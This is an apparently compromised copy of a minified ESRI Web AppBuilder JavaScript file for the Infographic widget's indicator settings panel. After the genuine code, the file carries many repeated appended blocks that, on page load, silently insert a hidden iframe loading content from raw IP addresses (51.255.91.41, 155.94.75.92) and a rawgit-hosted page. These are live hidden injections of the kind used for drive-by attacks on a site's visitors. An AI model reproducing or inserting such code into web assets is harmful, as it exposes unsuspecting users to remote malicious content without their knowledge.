// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/Infographic/setting/dijitsSetting/_dijits/SingleIndicator.html":'\x3cdiv class\x3d"marginTop15"\x3e\r\n\t\x3cdiv style\x3d"margin-bottom: 17px;" data-dojo-attach-point\x3d"indicatorTopLine" class\x3d"indicator-top-line"\x3e\x3c/div\x3e\r\n\r\n\t\x3cdiv class\x3d"tr"\x3e\r\n\r\n\t\t\x3cdiv class\x3d"flex-in-left"\x3e\r\n\t\t\t\x3cdiv title\x3d"${nls.ifValue}" class\x3d"labelTip flex-in-left-div textOverFlow"\x3e${nls.ifValue}\x3c/div\x3e\r\n\t\t\t\x3cdiv class\x3d"compareDiv"\x3e\r\n\t\t        \x3cselect data-dojo-type\x3d"dijit/form/Select" data-dojo-attach-point\x3d"operator"\x3e\r\n\t\t\t        \x3coption value\x3d"greater"\x3e${nls.numberOperatorIsGreaterThan}\x3c/option\x3e\r\n\t\t\t        \x3coption value\x3d"smaller"\x3e${nls.numberOperatorIsLessThan}\x3c/option\x3e\r\n\t\t\t        \x3coption value\x3d"between"\x3e${nls.numberOperatorIsBetween}\x3c/option\x3e\r\n\t\t\t        \x3coption value\x3d"equal"\x3e${nls.numberOperatorIsEqual}\x3c/option\x3e\r\n\t\t\t        \x3coption value\x3d"notEqual"\x3e${nls.numberOperatorIsNotEqual}\x3c/option\x3e\r\n\t\t        \x3c/select\x3e\r\n        \t\x3c/div\x3e\r\n\t\t\x3c/div\x3e\r\n\r\n\t\t\x3cdiv class\x3d"flex-in-right"\x3e\r\n\t\t\t\x3cdiv class\x3d"flex-in-left-div compareContainer"\x3e\r\n\t\t\t\t\x3cdiv data-dojo-attach-point\x3d"oneValueDiv"\x3e\r\n\t\t\t\t\t\x3cinput class\x3d"longValue" type\x3d"text" data-dojo-type\x3d"dijit/form/ValidationTextBox" data-dojo-props\x3d"regExp:\'^\\\\d+(\\\\.\\\\d+)?$\'" data-dojo-attach-event\x3d"change:_onUpdate" data-dojo-attach-point\x3d"compareValue" /\x3e\r\n\t\t\t\t\x3c/div\x3e\r\n\t\t\t\t\x3cdiv style\x3d"display: none;" class\x3d"compareContainer" data-dojo-attach-point\x3d"twoValueDiv"\x3e\r\n\t\t\t\t\t\x3cinput class\x3d"shortValue" type\x3d"text"data-dojo-type\x3d"dijit/form/ValidationTextBox" data-dojo-props\x3d"regExp:\'^\\\\d+(\\\\.\\\\d+)?$\'" data-dojo-attach-event\x3d"change:_onUpdate" data-dojo-attach-point\x3d"compareValue1" /\x3e\r\n\t\t\t\t\t\x3cspan class\x3d"textOverFlow" title\x3d"${nls.and}"\x3e${nls.and}\x3c/span\x3e\r\n\t\t\t\t\t\x3cinput class\x3d"shortValue" type\x3d"text" data-dojo-type\x3d"dijit/form/ValidationTextBox" data-dojo-props\x3d"regExp:\'^\\\\d+(\\\\.\\\\d+)?$\'" data-dojo-attach-event\x3d"change:_onUpdate" data-dojo-attach-point\x3d"compareValue2" /\x3e\r\n\t\t\t\t\x3c/div\x3e\r\n\t\t\t\x3c/div\x3e\r\n\t\t\t\x3cdiv data-dojo-attach-event\x3d"click:_removeIndicator" class\x3d"close-div close"\x3e\x3c/div\x3e\r\n\t\t\x3c/div\x3e\t\r\n\r\n\t\x3c/div\x3e\r\n\t\r\n\r\n\t\x3cdiv class\x3d"ratio-div" data-dojo-attach-point\x3d"ratioBtnDiv" style\x3d"overflow: hidden;"\x3e\r\n\t\t\x3cdiv class\x3d"ratio-in-div jimu-float-trailing"\x3e\r\n\t\t\t\x3cdiv data-dojo-type\x3d"jimu/dijit/CheckBox" data-dojo-attach-event\x3d"change:_onUpdate" data-dojo-attach-point\x3d"ratioBtn"\x3e\x3c/div\x3e\r\n\t\t\t\x3clabel class\x3d"marginleft10 text-left-center"\x3e${nls.ratio}\x3c/label\x3e\r\n\t\t\x3c/div\x3e\r\n\t\x3c/div\x3e\r\n\r\n\t\x3cdiv data-dojo-attach-point\x3d"indicatorOption"\x3e\r\n\t\t\x3cdiv class\x3d"tr marginTop10" data-dojo-attach-point\x3d"valueColorSetting"\x3e\r\n\t\t\t\x3cdiv class\x3d"flex-in-left then-text"\x3e\r\n\t\t\t\t\x3cdiv title\x3d"${nls.then}" class\x3d"flex-in-left-div labelTip textOverFlow"\x3e${nls.then}\x3c/div\x3e\r\n\t\t\t\t\x3cdiv title\x3d"${nls.changeValueColor}" class\x3d"then-tip color-tip textOverFlow"\x3e${nls.changeValueColor}\x3c/div\x3e\r\n\t\t\t\x3c/div\x3e\r\n\t\t\t\x3cdiv class\x3d"flex-in-right then-text"\x3e\r\n\t\t\t\t\x3cdiv class\x3d"flex-in-right-left-div then-text"\x3e\r\n\t\t\t\t\t\x3cdiv data-dojo-attach-point\x3d"valueColorSettingBtn"\x3e\x3c/div\x3e\r\n\t\t\t\t\x3c/div\x3e\r\n\t\t\t\t\t\r\n\t\t\t\t\x3cdiv data-dojo-attach-point\x3d"valueState" class\x3d"value-state activated"\x3e\x3c/div\x3e\r\n\t\t\t\x3c/div\x3e\r\n\t\t\x3c/div\x3e\r\n\t\t\r\n\t\t\x3cdiv style\x3d"margin-top: 5px;" class\x3d"tr" data-dojo-attach-point\x3d"gaugeColorSetting"\x3e\r\n\t\t\t\x3cdiv class\x3d"flex-in-left then-text"\x3e\r\n\t\t\t\t\x3cdiv class\x3d"flex-in-left-div labelTip"\x3e\x3c/div\x3e\r\n\t\t\t\t\x3cdiv title\x3d"${nls.changeGaugeColor}" class\x3d"then-tip color-tip textOverFlow"\x3e${nls.changeGaugeColor}\x3c/div\x3e\r\n\t\t\t\x3c/div\x3e\r\n\t\t\t\x3cdiv class\x3d"flex-in-right then-text"\x3e\r\n\t\t\t\t\x3cdiv class\x3d"flex-in-right-left-div then-text"\x3e\r\n\t\t\t\t\t\x3cdiv data-dojo-attach-point\x3d"gaugeColorSettingBtn"\x3e\x3c/div\x3e\r\n\t\t\t\t\x3c/div\x3e\r\n\t\t\t\t\x3cdiv data-dojo-attach-point\x3d"gaugeState" class\x3d"gauge-state activated"\x3e\x3c/div\x3e\r\n\t\t\t\x3c/div\x3e\r\n\t\t\x3c/div\x3e\r\n\r\n\t\t\x3cdiv style\x3d"margin-top: 5px;" class\x3d"tr" data-dojo-attach-point\x3d"indicatorIconSetting"\x3e\r\n\t\t\t\x3cdiv class\x3d"flex-in-left then-text"\x3e\r\n\t\t\t\t\x3cdiv class\x3d"flex-in-left-div labelTip"\x3e\x3c/div\x3e\r\n\t\t\t\t\x3cdiv  title\x3d"${nls.setIndicatorIcon}" class\x3d"then-tip color-tip textOverFlow"\x3e${nls.setIndicatorIcon}\x3c/div\x3e\r\n\t\t\t\x3c/div\x3e\r\n\t\t\t\x3cdiv class\x3d"flex-in-right then-text"\x3e\r\n\t\t\t\t\x3cdiv class\x3d"flex-in-right-left-div then-text"\x3e\r\n\t\t\t\t\t\x3cdiv data-dojo-attach-point\x3d"indicatorIconSettingBtn"\x3e\x3c/div\x3e\r\n\t\t\t\t\x3c/div\x3e\r\n\t\t\t\t\x3cdiv data-dojo-attach-point\x3d"iconState" class\x3d"icon-state activated"\x3e\x3c/div\x3e\r\n\t\t\t\x3c/div\x3e\r\n\t\t\x3c/div\x3e\r\n\t\x3c/div\x3e\r\n\r\n\x3c/div\x3e\r\n\r\n'}});
define("dojo/_base/declare dijit/_WidgetBase dojo/Evented dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin dojo/text!./SingleIndicator.html dojo/_base/Color dojo/on dojo/mouse dojo/query dojo/_base/html dojo/_base/lang jimu/utils jimu/dijit/ColorPickerPopup ./IconChooserPopup dojo/dom-style dijit/form/Select jimu/dijit/CheckBox".split(" "),function(n,p,v,q,r,w,k,g,t,m,c,d,l,u,x,e){var y=t.enter,z=t.leave,A=n([p,v,q,r],{baseClass:"infographic-setting-single-indicator",templateString:w,_valueEnable:!0,
_gaugeEnable:!0,_iconEnable:!0,nls:null,type:"",postCreate:function(){this.inherited(arguments);this._initUI();this.own(g(this.indicatorOption,"click",d.hitch(this,this._onIndicatorComponentClick)));this.setConfig(this.config);this._hasLoaded=!0},constructor:function(a){this.cacheColor={};this.config=a.config;this.type=a.type;this.folderUrl=a.folderUrl},switchTopLineDisplay:function(a){a?c.setStyle(this.indicatorTopLine,"display","block"):c.setStyle(this.indicatorTopLine,"display","none")},_onUpdate:function(){this._hasLoaded&&
this.emit("change")},_initUI:function(){this.own(g(this.operator,"change",d.hitch(this,this._onCompareChange)));"gauge"===this.type?(e.set(this.ratioBtnDiv,"display","block"),e.set(this.gaugeColorSetting,"display","flex"),e.set(this.indicatorIconSetting,"display","none")):"number"===this.type&&(e.set(this.ratioBtnDiv,"display","none"),e.set(this.gaugeColorSetting,"display","none"),e.set(this.indicatorIconSetting,"display","flex"));this.valueColorPicker=new u({appearance:{showTransparent:!1,showColorPalette:!0,
showCoustom:!0,showCoustomRecord:!0}});this.valueColorPicker.placeAt(this.valueColorSettingBtn);this.valueColorPicker.startup();this.valueColorPicker.setColor(new k("#808080"));this.own(g(this.valueColorPicker,"change",d.hitch(this,function(){this._onUpdate()})));"gauge"===this.type?(this.gaugeColorPicker=new u({appearance:{showTransparent:!1,showColorPalette:!0,showCoustom:!0,showCoustomRecord:!0}}),this.gaugeColorPicker.placeAt(this.gaugeColorSettingBtn),this.gaugeColorPicker.startup(),this.gaugeColorPicker.setColor(new k("#808080")),
this.own(g(this.gaugeColorPicker,"change",d.hitch(this,function(){this._onUpdate()})))):"number"===this.type&&(this.iconChooser=new x({nls:this.nls,folderUrl:this.folderUrl}),this.iconChooser.placeAt(this.indicatorIconSettingBtn),this.iconChooser.startup(),this.own(g(this.iconChooser,"change",d.hitch(this,function(){this._onUpdate()}))))},setConfig:function(a){if(this.config=a){this.operator.set("value",this.config.operator);this.config.isRatio?this.ratioBtn.check():this.ratioBtn.uncheck();this.config.valueColor?
this.valueColorPicker.setColor(new k(this.config.valueColor)):this._updateOptionDisplay(this.valueState);"gauge"===this.type&&(this.config.gaugeColor?this.gaugeColorPicker.setColor(new k(this.config.gaugeColor)):this._updateOptionDisplay(this.gaugeState));"number"===this.type&&(this.config.iconInfo?this.iconChooser.setConfig(this.config.iconInfo):this._updateOptionDisplay(this.iconState));var b=this.config.value;l.isNotEmptyObject(b,!0)&&setTimeout(d.hitch(this,function(){"between"!==this.config.operator?
this.compareValue.setValue(b[0]):(this.compareValue1.setValue(b[0]),this.compareValue2.setValue(b[1]))}),200)}},getConfig:function(){var a={},b=this._getValue();if(!l.isNotEmptyObject(b,!0))return a;a.value=b;b=this.operator.getValue();a.operator=b;"gauge"===this.type&&(a.isRatio=this.ratioBtn.checked);this.valueColorPicker&&this._valueEnable&&(b=this.valueColorPicker.getColor())&&(a.valueColor=b.toHex());this.gaugeColorPicker&&this._gaugeEnable&&(b=this.gaugeColorPicker.getColor())&&(a.gaugeColor=
b.toHex());"number"===this.type&&this.iconChooser&&this._iconEnable&&(b=this.iconChooser.getConfig(),a.iconInfo=b);return a},_onCompareChange:function(a){this.compareValue.setValue("");this.compareValue1.setValue("");this.compareValue2.setValue("");"between"===a?(e.set(this.oneValueDiv,"display","none"),e.set(this.twoValueDiv,"display","")):(e.set(this.oneValueDiv,"display",""),e.set(this.twoValueDiv,"display","none"))},_getValue:function(){var a=[];if("between"!==this.operator.getValue()){var b=
this.compareValue.getValue();this.compareValue.isValid()&&""!==b&&a.push(Number(b))}else{var b=this.compareValue1.getValue(),c=this.compareValue2.getValue();this.compareValue1.isValid()&&""!==b&&this.compareValue2.isValid()&&""!==c&&a.push(Number(b),Number(c))}return a},_removeIndicator:function(){this.emit("remove");this._onUpdate()},_updateOptionDisplay:function(a){if(c.hasClass(a,"activated")||c.hasClass(a,"deactivated")){var b,h,d,f;c.hasClass(a,"value-state")?(this._valueEnable=!this._valueEnable,
b=m(".color-tip",this.valueColorSetting)[0],f="value",h=this.valueColorPicker,d=null):c.hasClass(a,"gauge-state")?(this._gaugeEnable=!this._gaugeEnable,b=m(".color-tip",this.gaugeColorSetting)[0],f="gauge",h=this.gaugeColorPicker,d=null):c.hasClass(a,"icon-state")&&(this._iconEnable=!this._iconEnable,b=m(".color-tip",this.indicatorIconSetting)[0],f="icon",h=null,d=this.iconChooser);c.hasClass(b,"disable")?(c.removeClass(b,"disable"),h&&this.cacheColor[f]&&h.setColor(new k(this.cacheColor[f])),d&&
this.cacheColor[f]&&d.setIconColor(this.cacheColor[f]),c.addClass(a,"activated"),c.removeClass(a,"deactivated")):(c.addClass(b,"disable"),h&&(this.cacheColor[f]=h.getColor().toHex(),h.setColor(new k("#BCBCBC"))),d&&(d.getIconColor()&&(this.cacheColor[f]=d.getIconColor()),d.setIconColor("#BCBCBC")),c.removeClass(a,"activated"),c.addClass(a,"deactivated"));this._onUpdate()}},_onIndicatorComponentClick:function(a){this._updateOptionDisplay(a.target||a.srcElement)},destroy:function(){this.valueColorPicker&&
(this.valueColorPicker.destroy(),this.valueColorPicker=null);this.valueColorPicker&&(this.gaugeColorPicker.destroy(),this.gaugeColorPicker=null);this.iconChooser&&(this.iconChooser.destroy(),this.iconChooser=null);this.inherited(arguments)}});return n([p,q,r],{baseClass:"infographic-setting-multiple-indicators",templateString:'\x3cdiv\x3e\x3cdiv class\x3d"indicator-add-div" data-dojo-attach-point\x3d"addIndicator"\x3e\x3cdiv class\x3d"icon-add-indicator add-icon-deactive" data-dojo-attach-point\x3d"addIndicatorIcon"\x3e\x3c/div\x3e\x3cspan data-dojo-attach-point\x3d"addIndicatorTip" class\x3d"text-left-center marginleft10"\x3e${nls.addIndicatorTip}\x3c/span\x3e\x3c/div\x3e\x3cdiv class\x3d"indicatorDiv" data-dojo-attach-point\x3d"indicatorDiv"\x3e\x3c/div\x3e\x3c/div\x3e',
nls:null,postCreate:function(){this.inherited(arguments);l.preloadImg("setting/css/images/close.svg setting/css/images/close-mouseover.svg setting/css/images/indicator-on.svg setting/css/images/indicator-off.svg setting/css/images/add-icon-active.svg setting/css/images/add-icon-deactive.svg setting/css/images/arrow-drop-down.svg".split(" "),this.folderUrl);this._initEvent();this.setConfig(this.config)},_initEvent:function(){this.own(g(this.addIndicator,["click",y,z],d.hitch(this,function(a){a=a.type;
"click"===a?this._createIndicator():"mouseover"===a?(c.addClass(this.addIndicatorIcon,"add-icon-active"),c.removeClass(this.addIndicatorIcon,"add-icon-deactive"),c.addClass(this.addIndicatorTip,"add-indicator-tip-active"),c.removeClass(this.addIndicatorTip,"add-indicator-tip-deactive")):"mouseout"===a&&(c.removeClass(this.addIndicatorIcon,"add-icon-active"),c.addClass(this.addIndicatorIcon,"add-icon-deactive"),c.removeClass(this.addIndicatorTip,"add-indicator-tip-active"),c.addClass(this.addIndicatorTip,
"add-indicator-tip-deactive"))})))},constructor:function(){this.indecators=[]},setConfig:function(a){(this.config=a)&&this._setIndicators()},getConfig:function(){var a=[];this.indecators.forEach(d.hitch(this,function(b){b&&(b=b.dijit.getConfig(),l.isNotEmptyObject(b)&&a.push(b))}));return a},_setIndicators:function(){var a=this.config.indicators;a&&a.forEach(d.hitch(this,function(a){this._createIndicator(a)}))},_onUpdate:function(){this.emit("change")},_updateIndicatorTopLineDisplay:function(){this.indecators.forEach(d.hitch(this,
function(a,b){0===b&&a&&a.dijit&&a.dijit.switchTopLineDisplay(!1)}))},_createIndicator:function(a){var b={type:this.type,nls:this.nls,folderUrl:this.folderUrl};a&&(b.config=a);var c=new A(b);c.placeAt(this.indicatorDiv);c.startup();var e=l.getRandomString();this.own(g(c,"remove",d.hitch(this,function(){this.indecators=this.indecators.filter(function(a){return a.id!==e});c.destroy();c=null;this._updateIndicatorTopLineDisplay()})));this.own(g(c,"change",d.hitch(this,function(){this._onUpdate()})));
this.indecators.push({id:e,dijit:c});this._updateIndicatorTopLineDisplay()},destroy:function(){this.indecators&&this.indecators.forEach(d.hitch(this,function(a){a&&a.dijit&&(a.dijit.destroy(),a=null)}));this.inherited(arguments)}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});